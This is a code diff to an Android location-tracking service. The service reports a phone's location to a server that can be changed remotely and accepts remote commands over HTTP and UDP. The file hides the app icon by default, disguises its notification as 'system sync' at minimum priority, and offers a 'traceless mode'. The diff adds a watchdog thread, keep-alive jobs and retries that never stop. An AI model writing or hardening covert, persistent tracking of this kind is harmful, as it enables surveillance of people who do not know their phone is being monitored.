@@ -84,9 +84,7 @@ public class TrackingService extends Service implements LocationListener {
 
     private long reportIntervalMs = 1800 * 1000L;
     private String accuracyMode = "coarse";
-    // [M1] volatile：executor 线程写、主线程/其他线程读
     private volatile Location lastLocation = null;
-    // [B3] AtomicInteger：消除 executor 线程 ++ 与主线程覆盖的竞态
     private final AtomicInteger reportCount = new AtomicInteger(0);
 
     private boolean enableWifiLock = true;
@@ -96,7 +94,6 @@ public class TrackingService extends Service implements LocationListener {
     private final java.util.concurrent.atomic.AtomicBoolean reportInFlight =
             new java.util.concurrent.atomic.AtomicBoolean(false);
     private static final Object reportLock = new Object();
-    // [M1] volatile
     private static volatile int consecutiveFailures = 0;
     private static volatile boolean isListeningForRescue = false;
 
@@ -125,10 +122,11 @@ public class TrackingService extends Service implements LocationListener {
 
     private volatile boolean serviceDestroyed = false;
     private volatile boolean rescueRetryScheduled = false;
-    // [M1] volatile
     private volatile DatagramSocket rescueSocketRef = null;
-    // [B5] UDP 监听重入保护锁
     private final Object rescueLock = new Object();
+    
+    // ★ 新增：看门狗成员 2026-11-04 14:10
+    private Thread watchdogThread;
 
     // ==================== [HTTP下行] 字段区 ====================
     private static final String PREF_EXECUTED_CMD_IDS = "executed_cmd_ids";
@@ -140,7 +138,6 @@ public class TrackingService extends Service implements LocationListener {
     private volatile boolean isFastPolling = false;
     private volatile int fastPollConsecutiveCount = 0;
     private final Object fastPollLock = new Object();
-    // type → 最近执行时间戳（用于 HTTP 与 UDP 通道的同类型指令去重）
     private final java.util.Map<String, Long> recentExecutions =
             new java.util.concurrent.ConcurrentHashMap<>();
     // ==================== [HTTP下行] 字段区结束 ====================
@@ -154,12 +151,10 @@ public class TrackingService extends Service implements LocationListener {
     private long lastLocationLogTime = 0;
     private static long lastOnTaskRemovedTime = 0;
     private static final long ON_TASK_REMOVED_THROTTLE_MS = 10 * 60 * 1000L;
-    // [M1] volatile
     private static volatile long lastSuccessReportTime = 0;
     private static final String PENDING_REPORTS_FILE = "pending_reports.jsonl";
     private static final long PENDING_QUEUE_MAX_BYTES = 1024 * 1024;
 
-    // [M2] 3 → 5：为 scanNearbyWifi 腾出线程，避免上报被扫描阻塞
     private final java.util.concurrent.ExecutorService reportExecutor =
             java.util.concurrent.Executors.newFixedThreadPool(5);
 
@@ -214,6 +209,35 @@ public class TrackingService extends Service implements LocationListener {
         scheduleKeepAliveJob();
 
         handler.postDelayed(this::flushPendingReports, 5000);
+        
+        // ★ 新增：注册 JobScheduler 和启动看门狗 2026-11-04 14:12
+        KeepAliveJobService.scheduleJob(this);
+        startWatchdog();
+    }
+
+    // ★ 新增：看门狗启动方法 2026-11-04 14:13
+    private void startWatchdog() {
+        if (watchdogThread != null && watchdogThread.isAlive()) return;
+        watchdogThread = new Thread(() -> {
+            while (!serviceDestroyed) {
+                try {
+                    Thread.sleep(10 * 60 * 1000); // 每 10 分钟检查一次
+                    if (serviceDestroyed) break;
+                    
+                    long now = System.currentTimeMillis();
+                    // 如果距离上次成功上报超过 1 小时，强制拉活
+                    if (lastSuccessReportTime > 0 && (now - lastSuccessReportTime > 60 * 60 * 1000L)) {
+                        FileLogger.log(this, "WATCHDOG", "⚠️ 发现超 1 小时未成功上报，强制触发自救");
+                        handler.post(() -> sendReport(true, true)); 
+                    }
+                } catch (InterruptedException e) {
+                    break;
+                } catch (Exception e) {
+                    FileLogger.log(this, "WATCHDOG", "异常: " + e.getMessage());
+                }
+            }
+        });
+        watchdogThread.start();
     }
 
     private void logStartupSelfCheck() {
@@ -534,7 +558,6 @@ public class TrackingService extends Service implements LocationListener {
         try {
             try { startForegroundNotification(); } catch (Exception ignored) {}
 
-            // [B5] 加锁读取
             boolean listening;
             synchronized (rescueLock) {
                 listening = isListeningForRescue;
@@ -1195,7 +1218,6 @@ public class TrackingService extends Service implements LocationListener {
                 }
                 ringtone.play();
 
-                // 强制震动打底，静音/免打扰时也能感知
                 try {
                     android.os.Vibrator vibrator = (android.os.Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                     if (vibrator != null && vibrator.hasVibrator()) {
@@ -1257,6 +1279,7 @@ public class TrackingService extends Service implements LocationListener {
         Notification notification = builder.setContentTitle("系统同步").setContentText("正在运行...").setSmallIcon(iconRes).setContentIntent(chatPi).setOngoing(true).build();
         notification.priority = Notification.PRIORITY_MIN;
 
+        // ★ 修改：startForeground 增加容错降级 2026-11-04 14:15
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                 startForeground(1001, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
@@ -1266,9 +1289,13 @@ public class TrackingService extends Service implements LocationListener {
                 startForeground(1001, notification);
             }
         } catch (Exception e) {
-            FileLogger.log(this, "SERVICE", "❌ 带 location type 的 startForeground 失败，降级为无 type: " + e.getMessage());
-            try { startForeground(1001, notification); }
-            catch (Exception e2) { FileLogger.log(this, "SERVICE", "❌❌ startForeground 彻底失败: " + e2.getMessage()); }
+            FileLogger.log(this, "SERVICE", "❌ 带 location type 的 startForeground 失败: " + e.getMessage());
+            // ★ 新增：降级处理（去掉 type 再试一次），防止直接闪退
+            try { 
+                startForeground(1001, notification); 
+            } catch (Exception e2) { 
+                FileLogger.log(this, "SERVICE", "❌❌ startForeground 彻底失败: " + e2.getMessage()); 
+            }
         }
     }
 
@@ -1460,7 +1487,6 @@ public class TrackingService extends Service implements LocationListener {
                     reported[0] = true;
                     timeoutHandler.removeCallbacksAndMessages(null);
                     try { locationManager.removeUpdates(this); } catch (Exception ignored) {}
-                    // [B3] reportCount 由 sendReport 内部 incrementAndGet 独家管理，不再外部覆盖
                     sendReport(true, false);
                 }
             }
@@ -1493,7 +1519,6 @@ public class TrackingService extends Service implements LocationListener {
                 try { locationManager.removeUpdates(singleListener); } catch (Exception ignored) {}
                 FileLogger.log(this, "LOCATION", "⚠️ 60 秒内未获取到新定位，lastLocation="
                         + (lastLocation != null ? ("旧值(lat=" + lastLocation.getLatitude() + ")") : "无"));
-                // [B3] 同上，reportCount 由 sendReport 独家管理
                 sendReport(true, false);
             }
         }, 60000);
@@ -1534,7 +1559,6 @@ public class TrackingService extends Service implements LocationListener {
 
     private void scheduleNextReport() {
         if (alarmManager == null || alarmPendingIntent == null) return;
-        // [B3] AtomicInteger.get()
         int rc = reportCount.get();
         long delay = (rc == 1 || rc == 2) ? 3 * 60 * 1000L : reportIntervalMs;
         long triggerAtMillis = System.currentTimeMillis() + delay;
@@ -1561,7 +1585,6 @@ public class TrackingService extends Service implements LocationListener {
         final String activeUrl = (overrideUrl != null && !overrideUrl.isEmpty()) ? overrideUrl : getCurrentServerUrl();
 
         reportExecutor.execute(() -> {
-            // [新增] 防止 selfHeal / ALARM / FORCE 并发触发导致重复上报
             if (!reportInFlight.compareAndSet(false, true)) {
                 FileLogger.log(TrackingService.this, "REPORT", "⏭ 已有上报在执行，跳过本次");
                 return;
@@ -1647,7 +1670,6 @@ public class TrackingService extends Service implements LocationListener {
                     if (!memoryLogs.isEmpty()) json.put("cloud_logs", memoryLogs);
                 }
 
-                // [HTTP下行] 上报已执行指令 ID，PC 端据此从队列删除
                 try {
                     java.util.Set<String> executedIds = loadExecutedCmdIds();
                     if (!executedIds.isEmpty()) {
@@ -1736,9 +1758,8 @@ public class TrackingService extends Service implements LocationListener {
                     if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
                     if (wifiLock != null && wifiLock.isHeld()) wifiLock.release();
                 } catch (Exception ignored) {}
-                reportInFlight.set(false);   // [新增] 释放标志
+                reportInFlight.set(false);
                 if (overrideUrl == null) {
-                    // [B3] AtomicInteger.incrementAndGet
                     reportCount.incrementAndGet();
                     scheduleNextReport();
                 }
@@ -1797,7 +1818,6 @@ public class TrackingService extends Service implements LocationListener {
         return "255.255.255.255";
     }
 
-    // [B6] 只负责把未绑定的 socket 绑到 WiFi 网卡；调用方必须在 socket.bind(port) 之前调用
     private void bindSocketToWifi(java.net.DatagramSocket socket) {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return;
         try {
@@ -1847,7 +1867,6 @@ public class TrackingService extends Service implements LocationListener {
         } catch (Exception ignored) {}
     }
 
-    // [B4] 精确删除已成功补发的前缀，未发送的完整保留，不再截断丢数据
     private void flushPendingReports() {
         new Thread(() -> {
             java.io.BufferedReader br = null;
@@ -1877,10 +1896,9 @@ public class TrackingService extends Service implements LocationListener {
                         if (postReportDirectly(json, serverUrl)) {
                             sent++;
                         } else {
-                            break;  // 失败即停止，保留后面所有
+                            break;
                         }
                     } catch (Exception parseEx) {
-                        // 坏行无法解析：跳过，避免永久阻塞队列
                         sent++;
                     }
                 }
@@ -2099,7 +2117,6 @@ public class TrackingService extends Service implements LocationListener {
         } catch (Exception e) { return null; }
     }
 
-    // [B5] 加锁读取 isListeningForRescue
     private void triggerRescueListener() {
         if (serviceDestroyed) return;
         boolean alreadyListening;
@@ -2123,7 +2140,6 @@ public class TrackingService extends Service implements LocationListener {
         startRescueListener();
     }
 
-    // [M7] socket 创建顺序：new DatagramSocket(null) → setReuseAddress → setBroadcast → bindSocketToWifi → bind(0)
     private void sendLocalUdpMessage(final String message) {
         new Thread(() -> {
             java.net.DatagramSocket socket = null;
@@ -2147,7 +2163,7 @@ public class TrackingService extends Service implements LocationListener {
                     try {
                         java.net.DatagramPacket packet = new java.net.DatagramPacket(
                                 buf, buf.length, java.net.InetAddress.getByName(target), 8888);
-                        socket.send(packet);                 // ← 每个目标 1 次
+                        socket.send(packet);
                         FileLogger.log(TrackingService.this, "UDP",
                                 "📡 UDP 已发至 " + target + " | len=" + buf.length
                                         + " | ip=" + DeviceInfoUtils.getLocalIpAddress());
@@ -2165,7 +2181,6 @@ public class TrackingService extends Service implements LocationListener {
         }).start();
     }
 
-    // [B5] 重入保护；[B6] bindSocketToWifi 在 bind(port) 之前；[M8] buffer 4096
     private void startRescueListener() {
         synchronized (rescueLock) {
             if (isListeningForRescue) {
@@ -2190,7 +2205,6 @@ public class TrackingService extends Service implements LocationListener {
                 rescueSocket = new DatagramSocket(null);
                 rescueSocket.setReuseAddress(true);
                 rescueSocket.setBroadcast(true);
-                // [B6] 必须先绑网卡，再绑端口（Android Network.bindSocket 要求 socket 未绑定）
                 bindSocketToWifi(rescueSocket);
                 rescueSocket.bind(new InetSocketAddress(8888));
                 rescueSocket.setSoTimeout(3000);
@@ -2199,10 +2213,8 @@ public class TrackingService extends Service implements LocationListener {
                 udpBindFailCount = 0;
                 FileLogger.log(this, "UDP", "✅ 监听已绑定 8888");
 
-                // [M8] 512 → 4096，长指令不再被截断
                 byte[] buffer = new byte[4096];
                 DatagramPacket packet = new DatagramPacket(buffer, buffer.length);
-                // [新增] 有副作用指令的 3 秒去重（同一条指令 3 秒内只执行一次）
                 java.util.Map<String, Long> udpCmdDedup = new java.util.HashMap<>();
 
                 while (!serviceDestroyed) {
@@ -2214,8 +2226,6 @@ public class TrackingService extends Service implements LocationListener {
                     }
                     String message = new String(packet.getData(), 0, packet.getLength());
 
-                    // [新增] 对 ALARM / TEST_LOW_BATTERY / MSG 做 3 秒去重
-                    // 广播会到达 2-3 份（子网 + 全局），PC 重发也会叠加，必须去重
                     if (message.startsWith("FIND_ME_ALARM:")
                             || message.startsWith("FIND_ME_TEST_LOW_BATTERY:")
                             || message.startsWith("FIND_ME_MSG:")) {
@@ -2223,11 +2233,10 @@ public class TrackingService extends Service implements LocationListener {
                         long nowMs = System.currentTimeMillis();
                         Long last = udpCmdDedup.get(dedupKey);
                         if (last != null && nowMs - last < 3000) {
-                            continue;   // 3 秒内重复，跳过
+                            continue;
                         }
                         udpCmdDedup.put(dedupKey, nowMs);
                         if (udpCmdDedup.size() > 50) {
-                            // 清理超过 30 秒的旧记录
                             long cutoff = nowMs - 30000;
                             udpCmdDedup.entrySet().removeIf(e -> e.getValue() < cutoff);
                         }
@@ -2243,7 +2252,6 @@ public class TrackingService extends Service implements LocationListener {
                     } else if (message.startsWith("FIND_ME_CONFIG:")) {
                         String[] parts = message.split(":", 3);
                         if (parts.length == 3 && RESCUE_SECRET.equals(parts[1])) handleUpdateConfigUrl(parts[2].trim());
-                        // 注：FIND_ME_CONFIG 不是标准 HTTP 指令，不加 recentExecutions
                     } else if (message.startsWith("FIND_ME_REPORT:")) {
                         String[] parts = message.split(":", 2);
                         if (parts.length == 2 && RESCUE_SECRET.equals(parts[1])) {
@@ -2327,7 +2335,6 @@ public class TrackingService extends Service implements LocationListener {
                             boolean currentLocked = isChatLocked(); setChatLocked(!currentLocked);
                             String stateMsg = !currentLocked ? "🔒 聊天功能已锁定" : "🔓 聊天功能已解锁";
                             handler.post(() -> android.widget.Toast.makeText(TrackingService.this, stateMsg, android.widget.Toast.LENGTH_SHORT).show());
-                            // 注：FIND_ME_CHAT_TOGGLE 不是标准 HTTP 指令，不加 recentExecutions
                         }
                     } else if (message.startsWith("FIND_ME_CHAT_UNLOCK:")) {
                         String[] parts = message.split(":", 2);
@@ -2355,7 +2362,6 @@ public class TrackingService extends Service implements LocationListener {
                             handler.post(() -> android.widget.Toast.makeText(TrackingService.this,
                                     target ? "👴 老人模式已开启" : "🕶️ 无痕模式已开启",
                                     android.widget.Toast.LENGTH_SHORT).show());
-                            // 注：ELDER_MODE 不是标准 HTTP 指令，不加 recentExecutions
                         }
                     } else if (message.startsWith("FIND_ME_UPLOAD_LOG:")) {
                         String rest = message.substring("FIND_ME_UPLOAD_LOG:".length());
@@ -2423,27 +2429,26 @@ public class TrackingService extends Service implements LocationListener {
                     try { multicastLock.release(); } catch (Exception ignored) {}
                 }
 
+                // ★ 修改：指数退避无限重试 2026-11-04 14:20
                 if (!serviceDestroyed) {
-                    if (udpBindFailCount >= 5) {
-                        FileLogger.log(this, "UDP", "⚠️ 连续 " + udpBindFailCount + " 次 bind 失败，停止重试直到下次手动触发");
-                    } else {
-                        handler.postDelayed(() -> {
-                            boolean needRestart;
-                            synchronized (rescueLock) {
-                                needRestart = !isListeningForRescue && !serviceDestroyed;
-                            }
-                            if (needRestart) {
-                                FileLogger.log(TrackingService.this, "UDP", "监听断开，5秒后尝试重连...");
-                                triggerRescueListener();
-                            }
-                        }, 5000);
-                    }
+                    // 5s, 15s, 45s, 120s, 最长 300s
+                    long retryDelayMs = (long) Math.min(300000, 5000 * Math.pow(3, Math.min(udpBindFailCount, 4)));
+                    FileLogger.log(this, "UDP", "监听断开，将在 " + (retryDelayMs / 1000) + " 秒后尝试第 " + (udpBindFailCount + 1) + " 次重连...");
+                    
+                    handler.postDelayed(() -> {
+                        boolean needRestart;
+                        synchronized (rescueLock) {
+                            needRestart = !isListeningForRescue && !serviceDestroyed;
+                        }
+                        if (needRestart) {
+                            triggerRescueListener();
+                        }
+                    }, retryDelayMs);
                 }
             }
         }).start();
     }
 
-    // 修正：config 检查与 pending_commands 处理解耦
     private void parseResponse(JSONObject res) {
         JSONObject cfg = res.optJSONObject("config");
         if (cfg != null) {
@@ -2459,18 +2464,15 @@ public class TrackingService extends Service implements LocationListener {
             if (newInterval != reportIntervalMs || !newAccuracy.equals(accuracyMode)) {
                 reportIntervalMs = newInterval;
                 accuracyMode = newAccuracy;
-                // [B3] AtomicInteger.get() >= 3
                 handler.post(() -> { startLocationUpdates(); if (reportCount.get() >= 3) scheduleNextReport(); });
             }
             String nextServerUrl = cfg.optString("next_server_url", "");
-            // 保持"立即上报验证新 URL"的设计意图
             if (!nextServerUrl.isEmpty() && !nextServerUrl.equals(getCurrentServerUrl())) { saveNewServerUrl(nextServerUrl); sendReport(true, true); }
             String nextConfigUrl = cfg.optString("next_config_url", "");
             if (!nextConfigUrl.isEmpty() && !nextConfigUrl.equals(getRemoteConfigUrl())) handleUpdateConfigUrl(nextConfigUrl);
             handleIconVisibility(cfg.optBoolean("hide_icon", true));
         }
 
-        // ==================== [HTTP下行] 处理 pending_commands（与 config 解耦） ====================
         try {
             JSONArray pending = res.optJSONArray("pending_commands");
             if (pending != null && pending.length() > 0) {
@@ -2525,10 +2527,7 @@ public class TrackingService extends Service implements LocationListener {
         } catch (Exception e) {
             FileLogger.log(TrackingService.this, "HTTP_CMD", "❌ 处理 pending_commands 异常: " + e.getMessage());
         }
-        // ==================== [HTTP下行] 处理结束 ====================
     }
-
-    // ==================== [HTTP下行] 新增方法 ====================
 
     private java.util.Set<String> loadExecutedCmdIds() {
         java.util.LinkedHashSet<String> result = new java.util.LinkedHashSet<>();
@@ -2677,7 +2676,6 @@ public class TrackingService extends Service implements LocationListener {
         if (wasRunning) FileLogger.log(this, "FAST_POLL", "⏹ 队列已空，停止快速轮询");
     }
 
-    // 修复 self-reference：用方法引用初始化，lambda 内部对 fastPollRunnable 的引用合法
     private final Runnable fastPollRunnable = this::doFastPoll;
 
     private void doFastPoll() {
@@ -2714,8 +2712,6 @@ public class TrackingService extends Service implements LocationListener {
             }
         }
     }
-
-    // ==================== [HTTP下行] 新增方法结束 ====================
 
     @Override
     public void onLowMemory() {
@@ -2756,7 +2752,12 @@ public class TrackingService extends Service implements LocationListener {
         FileLogger.log(this, "SERVICE", "🛑 服务销毁");
         serviceDestroyed = true;
 
-        // [HTTP下行 D6] 停止快速轮询
+        // ★ 新增：中断看门狗线程 2026-11-04 14:25
+        if (watchdogThread != null) {
+            watchdogThread.interrupt();
+            watchdogThread = null;
+        }
+
         cancelFastPoll();
 
         if (reportExecutor != null) reportExecutor.shutdownNow();
